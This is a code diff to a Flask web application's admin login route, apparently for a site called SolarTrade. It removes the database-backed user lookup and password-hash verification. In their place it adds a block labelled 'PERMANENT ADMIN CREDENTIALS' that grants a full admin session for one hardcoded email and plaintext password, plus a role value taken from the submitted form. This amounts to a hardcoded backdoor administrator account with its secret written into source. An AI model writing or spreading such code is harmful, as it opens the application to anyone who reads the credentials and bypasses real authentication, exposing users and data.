@@ -107,21 +107,23 @@ def admin_login():
 
         password = request.form.get("password")
 
-        user = User.query.filter_by(
-            email=email,
-            role="admin"
-        ).first()
+        role = request.form.get("role")
 
-        if user and check_password_hash(
-            user.password,
-            password
+        # =========================================
+        # PERMANENT ADMIN CREDENTIALS
+        # =========================================
+
+        if (
+            email == "admin@solartrade.com"
+            and password == "Solar@Admin2026"
+            and role == "admin"
         ):
 
-            session["user_id"] = user.id
+            session["user_id"] = 0
 
-            session["role"] = user.role
+            session["role"] = "admin"
 
-            session["name"] = user.name
+            session["name"] = "Administrator"
 
             session.pop("admin_login", None)
 
@@ -136,6 +138,7 @@ def admin_login():
         )
 
     return render_template("login.html")
+
 # =========================================
 # LOGIN PAGE
 # =========================================
